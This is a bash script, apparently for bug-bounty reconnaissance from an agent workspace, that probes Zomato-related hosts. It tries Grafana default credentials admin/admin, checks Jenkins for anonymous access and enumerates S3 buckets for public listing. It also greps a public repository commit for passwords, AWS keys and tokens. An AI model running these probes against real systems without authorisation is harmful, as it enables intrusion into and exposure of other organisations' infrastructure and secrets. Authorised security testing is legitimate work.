#!/bin/bash
H1_USER="your_actual_h1_username"
HEADER="X-HackerOne: $H1_USER"
OUT="/Users/cliffordroberts/.openclaw/workspace/bugbounty/eternal/next_results.txt"
echo "=== Next Commands — $(date) ===" | tee "$OUT"

echo ""
echo "=== [1] Follow 302s + Grafana default creds + Jenkins anon ===" | tee -a "$OUT"
for host in airflow.zomans.com redash.zomans.com kibana.zomans.com grafana.zomans.com jenkins.zomans.com sentry.zomans.com; do
  DEST=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-time 6 -H "$HEADER" "https://$host/")
  echo "$host  ->  $DEST" | tee -a "$OUT"
done

echo ""
echo "--- Grafana default creds ---" | tee -a "$OUT"
curl -sk -H "$HEADER" -H "Content-Type: application/json" -d '{"user":"admin","password":"admin"}' "https://grafana.zomans.com/api/login" | python3 -m json.tool | tee -a "$OUT"

echo ""
echo "--- Jenkins anon access ---" | tee -a "$OUT"
curl -sk -H "$HEADER" "https://jenkins.zomans.com/api/json?pretty=true" | head -20 | tee -a "$OUT"

echo ""
echo "=== [2] Investigate 200s ===" | tee -a "$OUT"
echo "--- securitywebhook.zomans.com ---" | tee -a "$OUT"
curl -sk -H "$HEADER" "https://securitywebhook.zomans.com/" | head -40 | tee -a "$OUT"

echo ""
echo "--- ops.runnr.in headers ---" | tee -a "$OUT"
curl -si -H "$HEADER" "https://ops.runnr.in/" | grep -iE "set-cookie:|server:|x-powered-by:|location:" | tee -a "$OUT"

echo ""
echo "--- external-signup.zomans.com ---" | tee -a "$OUT"
curl -sk -H "$HEADER" "https://external-signup.zomans.com/" | head -40 | tee -a "$OUT"

echo ""
echo "=== [3] S3 deeper permutations ===" | tee -a "$OUT"
for b in zomato-prod zomato-staging zomato-dev zomato-backup zomato-logs zomato-data \
         hyperpure-prod hyperpure-staging hyperpure-backup hyperpure-data \
         grofers-prod grofers-staging grofers-backup grofers-data \
         runnr-prod runnr-staging runnr-backup runnr-data \
         zomato-images zomato-uploads zomato-exports zomato-reports \
         blinkit-prod blinkit-staging blinkit-data blinkit-uploads; do
  RESULT=$(aws s3 ls "s3://$b" --no-sign-request 2>&1)
  if echo "$RESULT" | grep -q "AccessDenied"; then
    echo "EXISTS (locked): $b" | tee -a "$OUT"
  elif ! echo "$RESULT" | grep -q "NoSuchBucket"; then
    echo "ACCESSIBLE: $b" | tee -a "$OUT"
    echo "$RESULT" | head -5 | tee -a "$OUT"
  fi
done

echo ""
echo "=== [4] Redash git commit check ===" | tee -a "$OUT"
cd /tmp && git clone --depth=100 https://github.com/Zomato/redash.git zomato-redash 2>/dev/null
cd /tmp/zomato-redash && git show 090b570a | grep -iE "(password|secret|key|token|aws|AKIA|database_url|redis)" | head -30 | tee -a "$OUT"

echo ""
echo "=== Done. Results saved to $OUT ==="
